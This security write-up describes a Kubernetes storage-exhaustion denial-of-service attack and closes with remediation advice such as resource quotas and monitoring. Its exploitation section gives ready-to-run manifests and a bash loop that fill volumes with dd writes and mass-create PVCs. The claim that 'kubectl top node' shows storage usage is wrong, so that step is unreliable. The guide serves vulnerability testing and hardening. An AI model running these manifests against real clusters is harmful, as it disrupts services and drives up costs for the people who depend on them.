# Kubernetes Storage Volume Exhaustion Attack

## 1. Overview Section

### Attack Vector Description

A storage volume exhaustion attack in Kubernetes aims to consume all available storage resources within a cluster.  An attacker exploits the Kubernetes dynamic volume provisioning or statically created volumes to fill up the underlying storage. The attacker could create a high number of PersistentVolumeClaims (PVCs) or repeatedly write data to existing volumes until no more space is available.  This can lead to service disruptions and denial of service (DoS) conditions for applications relying on the cluster's storage.

### Potential Impact and Consequences

*   **Denial of Service (DoS):** Applications that depend on persistent storage might fail to start or function correctly due to insufficient storage space.
*   **Data Loss:** If the storage backend fails due to exhaustion, data corruption or loss is possible.
*   **Application Instability:** Existing applications may experience crashes or performance degradation.
*   **Resource Starvation:**  The control plane and other Kubernetes components might struggle to manage the cluster effectively due to the stress on storage resources.
*   **Cost Increase:**  Unexpected storage usage can lead to significant cost increases, especially in cloud environments.

### Risk Level Assessment

**High** - While not always a remote code execution, the ease of execution and the potential for significant service disruption make this a high-risk vulnerability. An attacker with limited Kubernetes permissions (e.g., ability to create PVCs) can trigger a cluster-wide outage.

### Technical Explanation of Why This Vulnerability Exists

Kubernetes allows users to request persistent storage through PersistentVolumeClaims (PVCs). If proper resource quotas, limits, and monitoring are not in place, an attacker can exploit these features. Specifically:

*   **Lack of Resource Quotas:** Without quotas limiting the total storage a namespace or user can request, an attacker can exhaust storage by creating a large number of PVCs.
*   **Dynamic Provisioning:** Dynamic provisioning automatically creates PersistentVolumes (PVs) to satisfy PVCs. If the storage class doesn't have strict size limits or throttling, an attacker can create many small PVCs to consume storage.
*   **Insufficient Monitoring and Alerting:** Without proper monitoring, administrators may not be aware of storage exhaustion until it's too late.
*   **Insecure Volume Mounts:**  Pods granted overly permissive write access to shared volumes can be used to fill those volumes rapidly.

### Prerequisites and Conditions Needed

*   **Kubernetes Cluster:** Access to a Kubernetes cluster.
*   **Sufficient Permissions:** Ability to create PersistentVolumeClaims (PVCs) in at least one namespace.  Even `create` permissions on PVCs is often enough.
*   **Dynamic Provisioning:** At least one StorageClass configured for dynamic provisioning (though statically provisioned volumes can also be targeted).
*   **Network Access:** Network connectivity to the Kubernetes API server.
*   **`kubectl`:** Properly configured `kubectl` CLI tool to interact with the cluster.

## 2. Validation and Exploitation Steps Section

### Validation Phase: Identifying a Vulnerable Storage Configuration

**Step 1: Check Storage Classes**

```bash
kubectl get storageclass
```

**Explanation:** This command lists all available StorageClasses in the Kubernetes cluster.

**Why:** We need to identify StorageClasses that are configured for dynamic provisioning. Dynamic provisioning is often easier to exploit.

**Expected Output:** A list of StorageClasses, including the `NAME`, `PROVISIONER`, and `RECLAIMPOLICY`.

**What to Look For:** Identify StorageClasses with a `PROVISIONER` value that indicates dynamic provisioning (e.g., `kubernetes.io/aws-ebs`, `csi.gke.io`). Note the names of potentially vulnerable StorageClasses.

**Step 2: Check Resource Quotas (Optional, but highly recommended)**

```bash
kubectl get resourcequota -n <namespace>
```

**Explanation:** This command checks for resource quotas defined in a specific namespace. Replace `<namespace>` with the name of a namespace where you have permissions to create PVCs.  If no quotas are in place, try the `default` namespace.

**Why:** Resource quotas limit the resources a namespace can consume. If no quotas are defined, it indicates a potential vulnerability.

**Expected Output:** If a quota exists, you'll see details about the limits. If no quota exists, you'll get an error indicating that no resources were found.

**What to Look For:** A lack of resource quotas, particularly `requests.storage` and `persistentvolumeclaims`, in the targeted namespace.

**Step 3: Check Pod Security Policies (or Pod Security Admission)**

While less directly related to storage exhaustion, overly permissive Pod Security Policies (PSPs) or ineffective Pod Security Admission (PSA) configurations can make exploitation easier by allowing pods to request and consume more resources than they should.  However, these are often superseded by ResourceQuotas which are far more effective to mitigate storage exhaustion.

### Exploitation Phase: Exhausting Storage

**Step 4: Create a PVC Exhaustion Pod (Option 1: Single Pod, Large File)**

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: storage-exhaustion-pod
spec:
  volumes:
  - name: data-volume
    persistentVolumeClaim:
      claimName: storage-exhaustion-pvc
  containers:
  - name: storage-exhaustion-container
    image: busybox:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do dd if=/dev/urandom of=/data/exhaust.file bs=1M count=100; sleep 1; done"]  # Creates a 100MB file every second. Adjust count as needed.
    volumeMounts:
    - name: data-volume
      mountPath: /data
EOF
```

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: storage-exhaustion-pvc
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 10Gi  # Request 10GiB of storage initially. Adjust as needed.
  storageClassName: <your-storage-class-name> # Replace with the StorageClass identified in Step 1.
EOF
```

**Explanation:**
*   The first `kubectl apply` creates a Pod that continually writes random data to a file inside a mounted persistent volume.
*   The second `kubectl apply` creates the PersistentVolumeClaim (PVC) that the pod will use.
*   `<your-storage-class-name>` MUST be replaced with a valid storage class from Step 1.

**Why:** This pod will continuously write data to the persistent volume, attempting to fill up the underlying storage.

**Expected Output:** The pod should be created and transition to a `Running` state. The PVC will be bound to a PV. Over time, the storage volume will become full.

**What to Look For:** Monitor the storage usage on the underlying storage system (e.g., AWS EBS, Google Persistent Disk). You should see the storage usage increasing over time. Examine the logs with `kubectl logs storage-exhaustion-pod` and ensure dd is writing repeatedly.

**Alternative Approach (Option 2: Many Small PVCs)**

```bash
#!/bin/bash

NAMESPACE="default" # Adjust namespace as needed

for i in $(seq 1 50); do  # Creates 50 PVCs. Adjust as needed.
    cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: exhaustion-pvc-$i
  namespace: $NAMESPACE
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 500Mi # Request 500MiB per PVC.  Adjust as needed.
  storageClassName: <your-storage-class-name> # Replace with your StorageClass from Step 1
EOF
    sleep 0.2 # Adjust sleep time if the API throttles you
done
```

**Explanation:** This script creates multiple PersistentVolumeClaims (PVCs).

**Why:** Creating many small PVCs can quickly exhaust storage resources, especially if dynamic provisioning is enabled and no resource quotas are in place.  Some dynamic provisioners have a maximum number of volumes that can be created for a single instance, so larger total sizes spread across numerous volumes is often more effective at exhausting storage.

**Expected Output:** The script will create a series of PVCs.

**What to Look For:** Monitor the storage usage and the creation of PersistentVolumes (PVs). Use `kubectl get pvc -n <namespace>` and `kubectl get pv` to view the status of the claims and volumes.

**Step 5: Monitor Storage Usage (During and After Exploitation)**

```bash
kubectl top node
```

**Explanation:** This command displays resource usage of each node, including storage usage.

**Why:**  Monitoring storage usage helps confirm that the attack is successful and provides evidence of the vulnerability.

**Expected Output:**  A table showing the CPU, memory, and storage usage for each node.

**What to Look For:**  Nodes approaching or reaching 100% storage utilization. You can also check underlying cloud provider dashboards for storage metrics.

**Step 6: Observe Application Behavior (During and After Exploitation)**

Observe the behavior of applications running on the cluster.

**Why:** Storage exhaustion will likely cause applications to fail, crash, or become unresponsive. This demonstrates the real-world impact of the vulnerability.

**Expected Output:** Applications that rely on persistent storage may experience errors, timeouts, or unexpected behavior.

**What to Look For:** Error messages in application logs, failed deployments, and unresponsive services.

### Remediation Recommendations

*   **Implement Resource Quotas:** Enforce resource quotas at the namespace level to limit the total storage that can be requested.  Specifically `requests.storage` and `persistentvolumeclaims`.
*   **Set Storage Class Limits:** Configure storage class parameters to restrict the maximum volume size that can be provisioned. This could be done via parameters passed to the provisioner, or using a volume expansion controller.
*   **Monitor Storage Usage:** Implement monitoring and alerting to detect storage exhaustion early. Set alerts when storage usage exceeds a certain threshold.
*   **Use Request Limits:** Set resource requests and limits for storage on containers to prevent individual containers from consuming excessive storage.
*   **Review Pod Security Policies (PSPs) / Pod Security Admission (PSA):** Restrict the ability of pods to request excessive storage.
*   **Regular Audits:** Perform regular security audits of the Kubernetes cluster to identify and address potential vulnerabilities.
*   **Principle of Least Privilege:** Grant users and applications only the necessary permissions.  Avoid overly permissive roles and RBAC configurations.
*   **Implement Volume Snapshots and Backups:** Regularly backup persistent volumes to minimize data loss in case of storage failure.
*   **Educate and Train:** Train developers and operators about Kubernetes security best practices, including storage management.
